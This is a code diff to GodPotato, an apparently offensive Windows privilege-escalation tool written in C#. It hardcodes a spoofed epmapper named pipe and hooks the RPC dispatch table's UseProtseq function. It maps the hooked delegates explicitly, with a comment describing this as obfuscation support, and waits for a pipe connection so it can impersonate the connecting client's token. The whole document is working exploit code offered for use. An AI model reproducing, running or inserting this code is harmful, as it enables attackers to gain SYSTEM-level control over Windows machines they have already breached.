@@ -3,9 +3,12 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
+using System.Security.Permissions;
 using System.Security.Principal;
 using System.Threading;
+using SharpToken;
 using static GodPotato.NativeAPI.NativeMethods;
+using static GodPotato.NativeAPI.NewOrcbRPC;
 
 namespace GodPotato.NativeAPI
 {
@@ -28,6 +31,8 @@ namespace GodPotato.NativeAPI
         public string PipeName { get; set; }
         public bool IsStart { get; private set; }
         public bool IsHook { get; private set; }
+        public readonly string serverPipe = $"\\\\.\\pipe\\{"GodPotato"}\\pipe\\epmapper";
+        public readonly string clientPipe = $"ncacn_np:localhost/pipe/{"GodPotato"}[\\pipe\\epmapper]";
 
         public GodPotatoContext(TextWriter consoleWriter, string pipeName)
         {
@@ -47,12 +52,79 @@ namespace GodPotato.NativeAPI
             }
 
 
+            /*
+            
             string delegateFunName = "delegateFun" + UseProtseqFunctionParamCount;
             string funName = "fun" + UseProtseqFunctionParamCount;
 
             Type delegateFunType = typeof(NewOrcbRPC).GetNestedType(delegateFunName, System.Reflection.BindingFlags.Public);
+            this.useProtseqDelegate = Delegate.CreateDelegate(delegateFunType, newOrcbRPC, funName);
+            
+             */
 
-           this.useProtseqDelegate = Delegate.CreateDelegate(delegateFunType, newOrcbRPC, funName);
+
+
+            // Code obfuscation support
+            else if (UseProtseqFunctionParamCount == 4)
+            {
+                delegateFun4 df4 = newOrcbRPC.fun4;
+                useProtseqDelegate = df4;
+            }
+            else if (UseProtseqFunctionParamCount == 5)
+            {
+                delegateFun5 df5 = newOrcbRPC.fun5;
+                useProtseqDelegate = df5;
+            }
+            else if (UseProtseqFunctionParamCount == 6)
+            {
+                delegateFun6 df6 = newOrcbRPC.fun6;
+                useProtseqDelegate = df6;
+            }
+            else if (UseProtseqFunctionParamCount == 7)
+            {
+                delegateFun7 df7 = newOrcbRPC.fun7;
+                useProtseqDelegate = df7;
+            }
+            else if (UseProtseqFunctionParamCount == 8)
+            {
+                delegateFun8 df8 = newOrcbRPC.fun8;
+                useProtseqDelegate = df8;
+            }
+            else if (UseProtseqFunctionParamCount == 9)
+            {
+                delegateFun9 df9 = newOrcbRPC.fun9;
+                useProtseqDelegate = df9;
+            }
+            else if (UseProtseqFunctionParamCount == 10)
+            {
+                delegateFun10 df10 = newOrcbRPC.fun10;
+                useProtseqDelegate = df10;
+            }
+            else if (UseProtseqFunctionParamCount == 11)
+            {
+                delegateFun11 df11 = newOrcbRPC.fun11;
+                useProtseqDelegate = df11;
+            }
+            else if (UseProtseqFunctionParamCount == 12)
+            {
+                delegateFun12 df12 = newOrcbRPC.fun12;
+                useProtseqDelegate = df12;
+            }
+            else if (UseProtseqFunctionParamCount == 13)
+            {
+                delegateFun13 df13 = newOrcbRPC.fun13;
+                useProtseqDelegate = df13;
+            }
+            else if (UseProtseqFunctionParamCount == 14)
+            {
+                delegateFun14 df14 = newOrcbRPC.fun14;
+                useProtseqDelegate = df14;
+            }
+            else {
+                throw new Exception($"UseProtseqFunctionParamCount == ${UseProtseqFunctionParamCount}");
+            
+            }
+
 
         }
 
@@ -113,18 +185,18 @@ namespace GodPotato.NativeAPI
 
             try
             {
-                
-                string serverPipe = $"\\\\.\\pipe\\{PipeName}\\pipe\\epmapper";
-                SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();
+
+                NativeMethods.SECURITY_ATTRIBUTES securityAttributes = new NativeMethods.SECURITY_ATTRIBUTES();
                 securityAttributes.pSecurityDescriptor = securityDescriptor;
-                securityAttributes.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
+                securityAttributes.nLength = Marshal.SizeOf(typeof(NativeMethods.SECURITY_ATTRIBUTES));
                 pipeServerHandle = CreateNamedPipe(serverPipe, NativeMethods.PIPE_ACCESS_DUPLEX, NativeMethods.PIPE_TYPE_BYTE | NativeMethods.PIPE_READMODE_BYTE | NativeMethods.PIPE_WAIT, NativeMethods.PIPE_UNLIMITED_INSTANCES, 521, 0, 123, ref securityAttributes);
 
                 ConsoleWriter.WriteLine("[*] CreateNamedPipe " + serverPipe);
                 if (pipeServerHandle != BAD_HANLE)
                 {
+                    bool isConnect = ConnectNamedPipe(pipeServerHandle, IntPtr.Zero);
 
-                    if (ConnectNamedPipe(pipeServerHandle, IntPtr.Zero))
+                    if ((isConnect || Marshal.GetLastWin32Error() == ERROR_PIPE_CONNECTED) && IsStart)
                     {
                         ConsoleWriter.WriteLine("[*] Pipe Connected!");
                         if (ImpersonateNamedPipeClient(pipeServerHandle))
@@ -182,14 +254,12 @@ namespace GodPotato.NativeAPI
             {
                 ConsoleWriter.WriteLine("[!] " + e.Message);
             }
-            finally
-            {
-                if (pipeServerHandle != BAD_HANLE)
-                {
-                    CloseHandle(pipeServerHandle);
-                }
 
+            if (pipeServerHandle != BAD_HANLE)
+            {
+                CloseHandle(pipeServerHandle);
             }
+
             return;
         }
 
@@ -217,7 +287,7 @@ namespace GodPotato.NativeAPI
         }
         public void Restore()
         {
-            if (IsHook)
+            if (IsHook && UseProtseqFunctionPtr != IntPtr.Zero)
             {
                 Marshal.WriteIntPtr(DispatchTablePtr, UseProtseqFunctionPtr);
             }
@@ -230,12 +300,24 @@ namespace GodPotato.NativeAPI
         {
             if (IsStart)
             {
+                IsStart = false;
                 if (pipeServerThread.IsAlive)
                 {
-                    pipeServerThread.Interrupt();
-                    pipeServerThread.Abort();
+                    try
+                    {
+                        SharpToken.SECURITY_ATTRIBUTES securityAttributes = new SharpToken.SECURITY_ATTRIBUTES();
+                        IntPtr pipeClientHandle = NativeMethod.CreateFileW(serverPipe, (int)(NativeMethod.GENERIC_READ | NativeMethod.GENERIC_WRITE), FileShare.ReadWrite, ref securityAttributes, FileMode.Open, 0, IntPtr.Zero);
+                        FileStream stream = new FileStream(pipeClientHandle, FileAccess.ReadWrite);
+                        stream.WriteByte(0xaa);
+                        stream.Flush();
+                        stream.Close();
+                    }
+                    catch (Exception e)
+                    {
+                        pipeServerThread.Interrupt();
+                        pipeServerThread.Abort();
+                    }
                 }
-                IsStart = false;
             }
             else
             {
@@ -258,7 +340,7 @@ namespace GodPotato.NativeAPI
         }
         public int fun(IntPtr ppdsaNewBindings, IntPtr ppdsaNewSecurity)
         {
-            string[] endpoints = { $"ncacn_np:localhost/pipe/{godPotatoContext.PipeName}[\\pipe\\epmapper]", "ncacn_ip_tcp:fuck you !" };
+            string[] endpoints = { godPotatoContext.clientPipe, "ncacn_ip_tcp:fuck you !" };
 
             int entrieSize = 3;
             for (int i = 0; i < endpoints.Length; i++)
